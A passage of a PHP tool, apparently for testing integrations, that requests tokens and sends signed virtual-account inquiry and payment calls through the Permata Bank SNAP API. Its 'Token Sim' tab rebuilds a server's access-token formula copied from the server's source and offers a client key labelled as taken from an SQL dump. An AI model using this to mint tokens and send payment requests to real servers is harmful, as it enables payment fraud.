    }

    $result['access_token_used'] = $accessToken;
    $result['token_from_cache']  = $fromCache;
    return $result;
}

/** Internal: jalankan HTTP payment */
function _doPayment(
    string $accessToken,
    string $partnerServiceId,
    string $customerNo,
    string $virtualAccountNo,
    string $paymentRequestId = '',
    float  $paidAmount       = 0.0,
    float  $totalAmount      = 0.0,
    string $currency         = 'IDR',
    string $trxDateTime      = ''
): array {
    if (empty($paymentRequestId)) $paymentRequestId = snapExternalId();
    if (empty($trxDateTime))      $trxDateTime      = snapTimestamp();

    $externalId       = snapExternalId();
    $timestamp        = snapTimestamp();
    $snapPath         = SNAP_PATH_PAYMENT;
    $url              = URL_PAYMENT;
    $clientSecret     = getClientSecret();

    $partnerServiceId = str_pad($partnerServiceId, 8, ' ', STR_PAD_LEFT);

    $bodyArray = [
        'partnerServiceId' => $partnerServiceId,
        'customerNo'       => $customerNo,
        'virtualAccountNo' => $virtualAccountNo,
        'paymentRequestId' => $paymentRequestId,
        'trxDateTime'      => $trxDateTime,
        'paidAmount'       => ['value' => number_format($paidAmount, 2, '.', ''), 'currency' => $currency],
        'totalAmount'      => ['value' => number_format($totalAmount, 2, '.', ''), 'currency' => $currency],
    ];
    $jsonBody = json_encode($bodyArray, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    $signature = genSnapSignature('POST', $snapPath, $accessToken, $jsonBody, $timestamp, $clientSecret);

    $headers = [
        'Content-Type: application/json',
        'Authorization: Bearer ' . $accessToken,
        'X-TIMESTAMP: '          . $timestamp,
        'X-SIGNATURE: '          . $signature,
        'X-PARTNER-ID: '         . SNAP_PARTNER_ID,
        'X-EXTERNAL-ID: '        . $externalId,
        'CHANNEL-ID: '           . SNAP_CHANNEL_ID,
    ];

    $bodyHash = strtolower(hash('sha256', minifyJson($jsonBody)));
    $debug = [
        'url'          => $url,
        'snap_path'    => $snapPath,
        'timestamp'    => $timestamp,
        'external_id'  => $externalId,
        'body'         => $jsonBody,
        'body_sha256'  => $bodyHash,
        'string2sign'  => 'POST:' . $snapPath . ':' . $accessToken . ':' . $bodyHash . ':' . $timestamp,
        'x_signature'  => $signature,
    ];

    $result = httpPost($url, $headers, $jsonBody);

    if ($result['error']) {
        return [
            'success'              => false,
            'response_code'        => '',
            'error'                => 'cURL error: ' . $result['error'],
            'http_code'            => $result['http_code'],
            'raw'                  => '',
            'debug'                => $debug,
            'virtual_account_data' => [],
            'payment_flag_reason'  => [],
        ];
    }

    $decoded = json_decode($result['response'], true);
    $rc      = $decoded['responseCode']    ?? '';
    $msg     = $decoded['responseMessage'] ?? '';
    $success = ($rc === '2002500');

    return [
        'success'              => $success,
        'response_code'        => $rc,
        'response_message'     => $msg,
        'virtual_account_data' => $decoded['virtualAccountData'] ?? [],
        'payment_flag_reason'  => $decoded['paymentFlagReason']  ?? [],
        'http_code'            => $result['http_code'],
        'raw'                  => $result['response'],
        'error'                => $success ? '' : "[$rc] $msg",
        'debug'                => $debug,
    ];
}

// ==============================================================
// ========================= WEB UI =============================
// ==============================================================

$isCli = (PHP_SAPI === 'cli');

if ($isCli) {
    // ---- CLI mode ----
    $action    = $argv[1] ?? 'demo';
    $showDebug = in_array('--debug', $argv);

    $binArg    = $argv[2] ?? SNAP_BIN;
    $custArg   = $argv[3] ?? '000000000001';
    $vaArg     = $argv[4] ?? (SNAP_BIN . '000000000001');
    $paidArg   = (float)($argv[5] ?? 100000);
    $totalArg  = (float)($argv[6] ?? 100000);

    echo "================================================================\n";
    echo " Permata Bank SNAP API\n";
    echo " Waktu   : " . date('Y-m-d H:i:s') . "\n";
    echo " Server  : " . SNAP_BASE_URL . "\n";
    echo " Profil  : " . $_ACTIVE_PROFILE . " (" . SNAP_SUPPLIER_NAME . ")\n";
    echo " Partner : " . SNAP_PARTNER_ID . "\n";
    echo "================================================================\n";

    switch ($action) {
        case 'token':
            echo "\n[Token]\n";
            $tok = generateToken();
            echo " HTTP     : " . $tok['http_code'] . "\n";
            echo " Success  : " . ($tok['success'] ? 'Ya' : 'Tidak') . "\n";
            if ($tok['success']) echo " Token    : " . $tok['access_token'] . "\n";
            else                 echo " Error    : " . $tok['error'] . "\n";
            echo " Raw      : " . $tok['raw'] . "\n";
            if ($showDebug) { echo "\n[DEBUG]\n"; print_r($tok['debug']); }
            break;

        case 'inquiry':
            $inq = vaInquiry($binArg, $custArg, $vaArg);
            echo "\n[Inquiry] VA: $vaArg\n";
            echo " HTTP     : " . $inq['http_code'] . "\n";
            echo " Success  : " . ($inq['success'] ? 'Ya' : 'Tidak') . "\n";
            echo " RC       : " . ($inq['response_code'] ?? '') . "\n";
            echo " Token    : " . (($inq['token_from_cache'] ?? false) ? 'cache' : 'baru') . "\n";
            if (!$inq['success']) echo " Error    : " . $inq['error'] . "\n";
            echo " Raw      : " . $inq['raw'] . "\n";
            if ($showDebug) { echo "\n[DEBUG]\n"; print_r($inq['debug']); }
            break;

        case 'payment':
            $pay = vaPayment($binArg, $custArg, $vaArg, '', $paidArg, $totalArg);
            echo "\n[Payment] VA: $vaArg  IDR " . number_format($paidArg) . "\n";
            echo " HTTP     : " . $pay['http_code'] . "\n";
            echo " Success  : " . ($pay['success'] ? 'Ya' : 'Tidak') . "\n";
            echo " RC       : " . ($pay['response_code'] ?? '') . "\n";
            echo " Token    : " . (($pay['token_from_cache'] ?? false) ? 'cache' : 'baru') . "\n";
            if (!$pay['success']) echo " Error    : " . $pay['error'] . "\n";
            echo " Raw      : " . $pay['raw'] . "\n";
            if ($showDebug) { echo "\n[DEBUG]\n"; print_r($pay['debug']); }
            break;

        default: // demo
            echo "\n[Demo] Inquiry + Payment\n";
            $vaNo = SNAP_BIN . '000000000001';

            $inq = vaInquiry(SNAP_BIN, '000000000001', $vaNo);
            echo "\n--- Inquiry ---\n";
            echo " HTTP    : " . $inq['http_code'] . "\n";
            echo " RC      : " . ($inq['response_code'] ?? '') . "\n";
            echo " Token   : " . (($inq['token_from_cache'] ?? false) ? 'cache' : 'baru') . "\n";
            echo " Raw     : " . $inq['raw'] . "\n";

            $pay = vaPayment(SNAP_BIN, '000000000001', $vaNo, '', 100000, 100000);
            echo "\n--- Payment ---\n";
            echo " HTTP    : " . $pay['http_code'] . "\n";
            echo " RC      : " . ($pay['response_code'] ?? '') . "\n";
            echo " Token   : " . (($pay['token_from_cache'] ?? false) ? 'cache ✓' : 'baru') . "\n";
            echo " Raw     : " . $pay['raw'] . "\n";
    }
    echo "\n================================================================\n";
    exit;
}

// ==============================================================
// ========================= WEB UI HTML ========================
// ==============================================================

// Tangkap output jika ada POST/GET action
$uiResult  = null;
$uiAction  = $_REQUEST['action'] ?? '';
$uiError   = '';

if ($uiAction === 'token') {
    $uiResult = generateToken();

} elseif ($uiAction === 'tokensim') {
    // Simulasi kalkulasi token server-side (debug/verifikasi lokal)
    // Formula persis dari b2b.controller.php:
    //   $nTime = time() + 900;
    //   $accessToken = md5(base64_encode(hash_hmac('sha256', $nTime, $x_client_key, true)));
    $simClientKey = trim($_POST['sim_client_key'] ?? SNAP_CLIENT_KEY);
    $simOffset    = (int)($_POST['sim_offset'] ?? 0);   // bisa set manual untuk test
    $nTime        = time() + 900 + $simOffset;
    $simToken     = md5(base64_encode(hash_hmac('sha256', $nTime, $simClientKey, true)));
    $uiResult = [
        'success'       => true,
        'sim_client_key'=> $simClientKey,
        'n_time'        => $nTime,
        'n_time_human'  => date('Y-m-d H:i:s T', $nTime),
        'n_time_expire' => date('Y-m-d H:i:s T', $nTime),   // nTime = expire time
        'access_token'  => $simToken,
        'formula'       => 'md5(base64_encode(hash_hmac("sha256", nTime, x-client-key, true)))',
        'note'          => 'Ini simulasi lokal \u2014 token aktual diambil dari server via generateToken(). '
                         . 'Gunakan ini untuk debug jika server return 4012401.',
    ];

} elseif ($uiAction === 'inquiry') {
    $bin   = trim($_POST['bin']    ?? SNAP_BIN);
    $cust  = trim($_POST['cust']   ?? '');
    $vaNo  = trim($_POST['vano']   ?? '');
    $reqId = trim($_POST['reqid']  ?? '');
    if (empty($cust) || empty($vaNo)) {
        $uiError = 'customerNo dan virtualAccountNo wajib diisi.';
    } else {
        $uiResult = vaInquiry($bin, $cust, $vaNo, $reqId);
    }

} elseif ($uiAction === 'payment') {
    $bin   = trim($_POST['bin']       ?? SNAP_BIN);
    $cust  = trim($_POST['cust']      ?? '');
    $vaNo  = trim($_POST['vano']      ?? '');
    $paid  = (float)($_POST['paid']   ?? 0);
    $total = (float)($_POST['total']  ?? 0);
    $curr  = trim($_POST['currency']  ?? 'IDR');
    $reqId = trim($_POST['reqid']     ?? '');
    if (empty($cust) || empty($vaNo) || $paid <= 0) {
        $uiError = 'customerNo, virtualAccountNo, dan paidAmount wajib diisi.';
    } else {
        $uiResult = vaPayment($bin, $cust, $vaNo, $reqId, $paid, $total ?: $paid, $curr);
    }
}

// Helper render JSON
function prettyJson(?string $raw): string {
    if (empty($raw)) return '<em class="text-gray-400">—</em>';
    $dec = json_decode($raw, true);
    if ($dec === null) return htmlspecialchars($raw);
    return '<pre class="text-xs leading-relaxed">' . htmlspecialchars(json_encode($dec, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) . '</pre>';
}
function badge(bool $ok): string {
    return $ok
        ? '<span class="px-2 py-0.5 rounded-full bg-green-100 text-green-700 text-xs font-bold">✓ SUKSES</span>'
        : '<span class="px-2 py-0.5 rounded-full bg-red-100 text-red-700 text-xs font-bold">✗ GAGAL</span>';
}
function rcBadge(string $rc): string {
    $color = str_starts_with($rc, '2') ? 'bg-green-100 text-green-700' : 'bg-red-100 text-red-700';
    return $rc ? "<span class=\"px-2 py-0.5 rounded $color text-xs font-mono font-bold\">$rc</span>" : '—';
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Permata SNAP API — <?= htmlspecialchars(SNAP_SUPPLIER_NAME) ?></title>
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
<style>
  body { background: #f0f4f8; font-family: 'Segoe UI', system-ui, sans-serif; }
  .card { background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0,0,0,.08); }
  .tab-btn { transition: all .2s; }
  .tab-btn.active { background: #1d4ed8; color: #fff; }
  .tab-btn:not(.active):hover { background: #dbeafe; }
  .result-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 16px; }
  pre { white-space: pre-wrap; word-break: break-all; }
  input, select { transition: border-color .2s; }
  input:focus, select:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59,130,246,.15); }
</style>
</head>
<body class="min-h-screen py-8 px-4">

<!-- Header -->
<div class="max-w-3xl mx-auto mb-6">
  <div class="card p-5 flex items-center justify-between">
    <div>
      <div class="flex items-center gap-2 mb-1">
        <i class="fas fa-university text-blue-600 text-xl"></i>
        <h1 class="text-xl font-bold text-gray-800">Permata Bank SNAP API</h1>
      </div>
      <div class="text-sm text-gray-500 space-y-0.5">
        <div><span class="font-medium text-gray-600">Profil:</span> <?= htmlspecialchars($_ACTIVE_PROFILE) ?> — <?= htmlspecialchars(SNAP_SUPPLIER_NAME) ?></div>
        <div><span class="font-medium text-gray-600">Partner ID:</span> <?= htmlspecialchars(SNAP_PARTNER_ID) ?></div>
        <div><span class="font-medium text-gray-600">Server:</span> <code class="bg-gray-100 px-1 rounded text-xs"><?= htmlspecialchars(SNAP_BASE_URL) ?></code></div>
        <div><span class="font-medium text-gray-600">BIN VA:</span> <?= htmlspecialchars(SNAP_BIN) ?></div>
      </div>
    </div>
    <div class="text-right text-xs text-gray-400">
      <div><i class="fas fa-clock mr-1"></i><?= date('Y-m-d H:i:s') ?></div>
      <div class="mt-1">
        <span class="px-2 py-0.5 bg-blue-50 text-blue-600 rounded font-mono text-xs"><?= htmlspecialchars(SNAP_CLIENT_KEY) ?></span>
      </div>
    </div>
  </div>
</div>

<!-- Tab Nav -->
<div class="max-w-3xl mx-auto mb-4">
  <div class="flex gap-2 flex-wrap">
    <button onclick="showTab('token')"    id="tab-token"    class="tab-btn px-4 py-2 rounded-lg text-sm font-medium <?= $uiAction==='token'     ?'active':'' ?>">
      <i class="fas fa-key mr-1"></i>Token
    </button>
    <button onclick="showTab('inquiry')"  id="tab-inquiry"  class="tab-btn px-4 py-2 rounded-lg text-sm font-medium <?= $uiAction==='inquiry'   ?'active':'' ?>">
      <i class="fas fa-search-dollar mr-1"></i>Inquiry
    </button>
    <button onclick="showTab('payment')"  id="tab-payment"  class="tab-btn px-4 py-2 rounded-lg text-sm font-medium <?= $uiAction==='payment'   ?'active':'' ?>">
      <i class="fas fa-money-bill-wave mr-1"></i>Payment
    </button>
    <button onclick="showTab('tokensim')" id="tab-tokensim" class="tab-btn px-4 py-2 rounded-lg text-sm font-medium <?= $uiAction==='tokensim'  ?'active':'' ?>">
      <i class="fas fa-flask mr-1"></i>Token Sim
    </button>
    <button onclick="showTab('info')"     id="tab-info"     class="tab-btn px-4 py-2 rounded-lg text-sm font-medium <?= $uiAction==='info'      ?'active':'' ?>">
      <i class="fas fa-info-circle mr-1"></i>Info
    </button>
  </div>
</div>

<!-- Error global -->
<?php if ($uiError): ?>
<div class="max-w-3xl mx-auto mb-4 p-4 bg-red-50 border border-red-200 rounded-lg text-red-700 text-sm">
  <i class="fas fa-exclamation-triangle mr-2"></i><?= htmlspecialchars($uiError) ?>
</div>
<?php endif; ?>

<!-- ====== TAB: TOKEN ====== -->
<div id="pane-token" class="max-w-3xl mx-auto <?= $uiAction!=='token'?'hidden':'' ?>">
  <div class="card p-6">
    <h2 class="text-base font-semibold text-gray-700 mb-4"><i class="fas fa-key text-blue-500 mr-2"></i>Generate Access Token</h2>
    <div class="result-box mb-4 text-sm text-gray-600">
      <div><strong>Endpoint:</strong> <code class="text-blue-700"><?= htmlspecialchars(URL_TOKEN) ?></code></div>
      <div class="mt-1"><strong>Catatan:</strong> Server hanya cek <code>x-client-key</code> di DB. Token berlaku <strong>900 detik</strong> (15 menit).</div>
    </div>
    <form method="POST">
      <input type="hidden" name="action" value="token">
      <button type="submit" class="w-full py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg transition">
        <i class="fas fa-bolt mr-2"></i>Generate Token Sekarang
      </button>
    </form>

    <?php if ($uiAction === 'token' && $uiResult): ?>
    <div class="mt-5">
      <div class="flex items-center gap-3 mb-3">
        <?= badge($uiResult['success']) ?>
        <span class="text-sm">HTTP <?= $uiResult['http_code'] ?></span>
        <?= rcBadge($uiResult['response_code'] ?? '') ?>
      </div>
      <?php if ($uiResult['success']): ?>
      <div class="grid grid-cols-2 gap-3 mb-3">
        <div class="result-box">
          <div class="text-xs text-gray-500 mb-1">Access Token</div>
          <code class="text-sm text-green-700 break-all font-bold"><?= htmlspecialchars($uiResult['access_token']) ?></code>
        </div>
        <div class="result-box">
          <div class="text-xs text-gray-500 mb-1">Berlaku</div>
          <span class="text-sm font-bold text-gray-700"><?= $uiResult['expires_in'] ?> detik</span>
          <span class="text-xs text-gray-400 ml-1">(~<?= round($uiResult['expires_in']/60) ?> menit)</span>
        </div>
      </div>
      <?php else: ?>
      <div class="p-3 bg-red-50 border border-red-200 rounded-lg text-red-700 text-sm mb-3">
        <i class="fas fa-times-circle mr-1"></i><?= htmlspecialchars($uiResult['error']) ?>
        <?php if (!empty($uiResult['debug']['note'])): ?>
        <div class="mt-1 text-xs text-red-500"><?= htmlspecialchars($uiResult['debug']['note']) ?></div>
        <?php endif; ?>
      </div>
      <?php endif; ?>
      <details class="mt-2">
        <summary class="text-xs text-gray-400 cursor-pointer hover:text-gray-600">Raw Response &amp; Debug</summary>
        <div class="mt-2 result-box text-xs">
          <div class="font-semibold text-gray-500 mb-1">Raw Response:</div>
          <?= prettyJson($uiResult['raw'] ?? '') ?>
          <div class="font-semibold text-gray-500 mt-3 mb-1">Debug:</div>
          <?php foreach ($uiResult['debug'] as $k => $v): ?>
          <div class="mb-0.5"><span class="font-mono text-blue-600"><?= $k ?>:</span> <span class="break-all"><?= htmlspecialchars((string)$v) ?></span></div>
          <?php endforeach; ?>
        </div>
      </details>
    </div>
    <?php endif; ?>
  </div>
</div>

<!-- ====== TAB: INQUIRY ====== -->
<div id="pane-inquiry" class="max-w-3xl mx-auto <?= $uiAction!=='inquiry'?'hidden':'' ?>">
  <div class="card p-6">
    <h2 class="text-base font-semibold text-gray-700 mb-1"><i class="fas fa-search-dollar text-indigo-500 mr-2"></i>VA Inquiry</h2>
    <p class="text-xs text-gray-400 mb-4">Token diambil <strong>otomatis</strong> — tidak perlu generate manual.</p>
    <div class="result-box mb-4 text-sm text-gray-600">
      <div><strong>Endpoint:</strong> <code class="text-indigo-700"><?= htmlspecialchars(URL_INQUIRY) ?></code></div>
    </div>

    <form method="POST" class="space-y-3">
      <input type="hidden" name="action" value="inquiry">
      <div class="grid grid-cols-2 gap-3">
        <div>
          <label class="block text-xs font-medium text-gray-600 mb-1">BIN / partnerServiceId</label>
          <input type="text" name="bin" value="<?= htmlspecialchars($_POST['bin'] ?? SNAP_BIN) ?>"
                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="<?= SNAP_BIN ?>">
          <p class="text-xs text-gray-400 mt-0.5">Akan di-pad kiri jadi 8 karakter</p>
        </div>
        <div>
          <label class="block text-xs font-medium text-gray-600 mb-1">Customer No <span class="text-red-500">*</span></label>
          <input type="text" name="cust" value="<?= htmlspecialchars($_POST['cust'] ?? '') ?>"
                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="12–16 digit numerik" required>
        </div>
      </div>
      <div>
        <label class="block text-xs font-medium text-gray-600 mb-1">Virtual Account No <span class="text-red-500">*</span></label>
        <input type="text" name="vano" value="<?= htmlspecialchars($_POST['vano'] ?? '') ?>"
               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="<?= SNAP_BIN ?>xxxxxxxx (12–16 digit)" required>
      </div>
      <div>
        <label class="block text-xs font-medium text-gray-600 mb-1">Inquiry Request ID <span class="text-gray-400">(opsional, auto-generate jika kosong)</span></label>
        <input type="text" name="reqid" value="<?= htmlspecialchars($_POST['reqid'] ?? '') ?>"
               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="UUID auto-generate">
      </div>
      <button type="submit" class="w-full py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white font-semibold rounded-lg transition">
        <i class="fas fa-search mr-2"></i>Kirim Inquiry
      </button>
    </form>

    <?php if ($uiAction === 'inquiry' && $uiResult): ?>
    <div class="mt-5">
      <div class="flex items-center gap-3 mb-3 flex-wrap">
        <?= badge($uiResult['success']) ?>
        <span class="text-sm">HTTP <?= $uiResult['http_code'] ?></span>
        <?= rcBadge($uiResult['response_code'] ?? '') ?>
        <span class="text-xs text-gray-400">Token: <?= ($uiResult['token_from_cache'] ?? false) ? '♻ dari cache' : '🔄 baru fetch' ?></span>
        <?php if (!empty($uiResult['access_token_used'])): ?>
        <span class="text-xs font-mono text-gray-400"><?= htmlspecialchars(substr($uiResult['access_token_used'], 0, 20)) ?>…</span>
        <?php endif; ?>
      </div>

      <?php if (!$uiResult['success']): ?>
      <div class="p-3 bg-red-50 border border-red-200 rounded-lg text-red-700 text-sm mb-3">
        <i class="fas fa-times-circle mr-1"></i><?= htmlspecialchars($uiResult['error']) ?>
      </div>
      <?php endif; ?>

      <?php if (!empty($uiResult['virtual_account_data'])): ?>
      <div class="result-box mb-3">
        <div class="text-xs font-semibold text-gray-500 mb-2">Virtual Account Data</div>
        <?php $va = $uiResult['virtual_account_data']; ?>
        <div class="grid grid-cols-2 gap-2 text-sm">
          <?php foreach (['name','totalAmount','partnerServiceId','customerNo','virtualAccountNo','billDetails'] as $f): ?>
          <?php if (isset($va[$f])): ?>
          <div>
            <span class="text-xs text-gray-500"><?= $f ?>:</span>
            <span class="font-medium text-gray-700">
              <?= is_array($va[$f]) ? json_encode($va[$f], JSON_UNESCAPED_UNICODE) : htmlspecialchars((string)$va[$f]) ?>
            </span>
          </div>
          <?php endif; ?>
          <?php endforeach; ?>
        </div>
      </div>
      <?php endif; ?>

      <details>
        <summary class="text-xs text-gray-400 cursor-pointer hover:text-gray-600">Raw Response &amp; Debug</summary>
        <div class="mt-2 result-box text-xs">
          <?= prettyJson($uiResult['raw'] ?? '') ?>
          <div class="font-semibold text-gray-500 mt-3 mb-1">Debug:</div>
          <?php foreach ($uiResult['debug'] as $k => $v): ?>
          <div class="mb-0.5"><span class="font-mono text-indigo-600"><?= $k ?>:</span> <span class="break-all"><?= htmlspecialchars((string)$v) ?></span></div>
          <?php endforeach; ?>
        </div>
      </details>
    </div>
    <?php endif; ?>
  </div>
</div>

<!-- ====== TAB: PAYMENT ====== -->
<div id="pane-payment" class="max-w-3xl mx-auto <?= $uiAction!=='payment'?'hidden':'' ?>">
  <div class="card p-6">
    <h2 class="text-base font-semibold text-gray-700 mb-1"><i class="fas fa-money-bill-wave text-emerald-500 mr-2"></i>VA Payment</h2>
    <p class="text-xs text-gray-400 mb-4">Token diambil <strong>otomatis</strong> — tidak perlu generate manual.</p>
    <div class="result-box mb-4 text-sm text-gray-600">
      <div><strong>Endpoint:</strong> <code class="text-emerald-700"><?= htmlspecialchars(URL_PAYMENT) ?></code></div>
    </div>

    <form method="POST" class="space-y-3">
      <input type="hidden" name="action" value="payment">
      <div class="grid grid-cols-2 gap-3">
        <div>
          <label class="block text-xs font-medium text-gray-600 mb-1">BIN / partnerServiceId</label>
          <input type="text" name="bin" value="<?= htmlspecialchars($_POST['bin'] ?? SNAP_BIN) ?>"
                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm">
        </div>
        <div>
          <label class="block text-xs font-medium text-gray-600 mb-1">Customer No <span class="text-red-500">*</span></label>
          <input type="text" name="cust" value="<?= htmlspecialchars($_POST['cust'] ?? '') ?>"
                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="12–16 digit numerik" required>
        </div>
      </div>
      <div>
        <label class="block text-xs font-medium text-gray-600 mb-1">Virtual Account No <span class="text-red-500">*</span></label>
        <input type="text" name="vano" value="<?= htmlspecialchars($_POST['vano'] ?? '') ?>"
               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="12–16 digit" required>
      </div>
      <div class="grid grid-cols-3 gap-3">
        <div>
          <label class="block text-xs font-medium text-gray-600 mb-1">Paid Amount <span class="text-red-500">*</span></label>
          <input type="number" name="paid" value="<?= htmlspecialchars($_POST['paid'] ?? '') ?>"
                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="100000" min="1" required>
        </div>
        <div>
          <label class="block text-xs font-medium text-gray-600 mb-1">Total Amount</label>
          <input type="number" name="total" value="<?= htmlspecialchars($_POST['total'] ?? '') ?>"
                 class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="= Paid Amount jika kosong">
        </div>
        <div>
          <label class="block text-xs font-medium text-gray-600 mb-1">Currency</label>
          <select name="currency" class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm">
            <option value="IDR" <?= ($_POST['currency'] ?? 'IDR') === 'IDR' ? 'selected' : '' ?>>IDR</option>
          </select>
        </div>
      </div>
      <div>
        <label class="block text-xs font-medium text-gray-600 mb-1">Payment Request ID <span class="text-gray-400">(opsional)</span></label>
        <input type="text" name="reqid" value="<?= htmlspecialchars($_POST['reqid'] ?? '') ?>"
               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm" placeholder="UUID auto-generate">
      </div>
      <button type="submit" class="w-full py-2.5 bg-emerald-600 hover:bg-emerald-700 text-white font-semibold rounded-lg transition">
        <i class="fas fa-paper-plane mr-2"></i>Kirim Payment
      </button>
    </form>

    <?php if ($uiAction === 'payment' && $uiResult): ?>
    <div class="mt-5">
      <div class="flex items-center gap-3 mb-3 flex-wrap">
        <?= badge($uiResult['success']) ?>
        <span class="text-sm">HTTP <?= $uiResult['http_code'] ?></span>
        <?= rcBadge($uiResult['response_code'] ?? '') ?>
        <span class="text-xs text-gray-400">Token: <?= ($uiResult['token_from_cache'] ?? false) ? '♻ dari cache' : '🔄 baru fetch' ?></span>
      </div>

      <?php if (!$uiResult['success']): ?>
      <div class="p-3 bg-red-50 border border-red-200 rounded-lg text-red-700 text-sm mb-3">
        <i class="fas fa-times-circle mr-1"></i><?= htmlspecialchars($uiResult['error']) ?>
      </div>
      <?php endif; ?>

      <?php if (!empty($uiResult['virtual_account_data'])): ?>
      <div class="result-box mb-3">
        <div class="text-xs font-semibold text-gray-500 mb-2">Payment Result</div>
        <pre class="text-xs"><?= htmlspecialchars(json_encode($uiResult['virtual_account_data'], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE)) ?></pre>
      </div>
      <?php endif; ?>

      <details>
        <summary class="text-xs text-gray-400 cursor-pointer hover:text-gray-600">Raw Response &amp; Debug</summary>
        <div class="mt-2 result-box text-xs">
          <?= prettyJson($uiResult['raw'] ?? '') ?>
          <div class="font-semibold text-gray-500 mt-3 mb-1">Debug:</div>
          <?php foreach ($uiResult['debug'] as $k => $v): ?>
          <div class="mb-0.5"><span class="font-mono text-emerald-600"><?= $k ?>:</span> <span class="break-all"><?= htmlspecialchars((string)$v) ?></span></div>
          <?php endforeach; ?>
        </div>
      </details>
    </div>
    <?php endif; ?>
  </div>
</div>

<!-- ====== TAB: TOKEN SIM ====== -->
<div id="pane-tokensim" class="max-w-3xl mx-auto <?= $uiAction!=='tokensim'?'hidden':'' ?>">
  <div class="card p-6">
    <h2 class="text-base font-semibold text-gray-700 mb-1"><i class="fas fa-flask text-amber-500 mr-2"></i>Simulasi Token Server-Side</h2>
    <p class="text-xs text-gray-400 mb-4">
      Menghitung token persis seperti yang dilakukan server (<code>b2b.controller.php</code>).
      Gunakan untuk debug jika token aktual berbeda atau tidak valid.
    </p>
    <div class="result-box mb-4 text-sm text-gray-600 text-xs">
      <strong>Formula server:</strong><br>
      <code class="text-amber-700">$nTime = time() + 900;<br>
      $token = md5(base64_encode(hash_hmac('sha256', $nTime, $x_client_key, true)));</code>
    </div>

    <form method="POST" class="space-y-3">
      <input type="hidden" name="action" value="tokensim">
      <div>
        <label class="block text-xs font-medium text-gray-600 mb-1">X-CLIENT-KEY</label>
        <input type="text" name="sim_client_key" value="<?= htmlspecialchars($_POST['sim_client_key'] ?? SNAP_CLIENT_KEY) ?>"
               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm font-mono">
        <?php if (!empty(SNAP_CLIENT_KEY_ALT)): ?>
        <div class="text-xs text-gray-400 mt-1">Alternatif (dari SQL dump): <code class="text-amber-600"><?= htmlspecialchars(SNAP_CLIENT_KEY_ALT) ?></code></div>
        <?php endif; ?>
      </div>
      <div>
        <label class="block text-xs font-medium text-gray-600 mb-1">Offset waktu (detik, default 0)</label>
        <input type="number" name="sim_offset" value="<?= htmlspecialchars($_POST['sim_offset'] ?? '0') ?>"
               class="w-full border border-gray-300 rounded-lg px-3 py-2 text-sm">
        <div class="text-xs text-gray-400 mt-1">0 = waktu sekarang. nTime = time() + 900 + offset</div>
      </div>
      <button type="submit" class="w-full py-2.5 bg-amber-500 hover:bg-amber-600 text-white font-semibold rounded-lg transition">
        <i class="fas fa-calculator mr-2"></i>Hitung Token
      </button>
    </form>

    <?php if ($uiAction === 'tokensim' && $uiResult): ?>
    <div class="mt-5 result-box">
      <div class="text-xs font-semibold text-gray-500 mb-2">Hasil Simulasi</div>
      <?php foreach ($uiResult as $k => $v): ?>
      <?php if ($k === 'success') continue; ?>
      <div class="mb-1 text-xs">
        <span class="font-mono text-amber-700 inline-block w-32"><?= $k ?>:</span>
        <span class="font-<?= $k==='access_token'?'bold':'normal' ?> break-all <?= $k==='access_token'?'text-indigo-700':'' ?>">
          <?= htmlspecialchars((string)$v) ?>
        </span>
      </div>
      <?php endforeach; ?>
    </div>
    <?php endif; ?>
  </div>
</div>

<!-- ====== TAB: INFO ====== -->
<div id="pane-info" class="max-w-3xl mx-auto <?= $uiAction!=='info'?'hidden':'' ?>">
  <div class="card p-6">
    <h2 class="text-base font-semibold text-gray-700 mb-4"><i class="fas fa-info-circle text-blue-500 mr-2"></i>Info Teknis &amp; Source Code Notes</h2>

    <div class="space-y-4 text-xs text-gray-700">

      <div class="bg-blue-50 border border-blue-200 rounded-lg p-3">
        <div class="font-semibold text-blue-700 mb-2">Profil Aktif: <?= htmlspecialchars(SNAP_SUPPLIER_NAME) ?></div>
        <table class="w-full text-xs">
          <tr><td class="text-gray-500 w-36">Partner ID</td><td class="font-mono"><?= htmlspecialchars(SNAP_PARTNER_ID) ?></td></tr>
          <tr><td class="text-gray-500">Client Key</td><td class="font-mono"><?= htmlspecialchars(SNAP_CLIENT_KEY) ?></td></tr>
          <?php if (!empty(SNAP_CLIENT_KEY_ALT)): ?>
          <tr><td class="text-gray-500">Client Key Alt</td><td class="font-mono text-amber-600"><?= htmlspecialchars(SNAP_CLIENT_KEY_ALT) ?></td></tr>
          <?php endif; ?>
          <tr><td class="text-gray-500">Supplier</td><td class="font-mono"><?= htmlspecialchars(SNAP_SUPPLIER_CODE) ?></td></tr>
          <tr><td class="text-gray-500">Channel ID</td><td class="font-mono"><?= htmlspecialchars(SNAP_CHANNEL_ID) ?></td></tr>
          <tr><td class="text-gray-500">BIN/partSvcId</td><td class="font-mono"><?= htmlspecialchars(SNAP_BIN ?: '(kosong)') ?></td></tr>
        </table>
      </div>

      <div class="bg-green-50 border border-green-200 rounded-lg p-3">
        <div class="font-semibold text-green-700 mb-2">Endpoint Aktif</div>
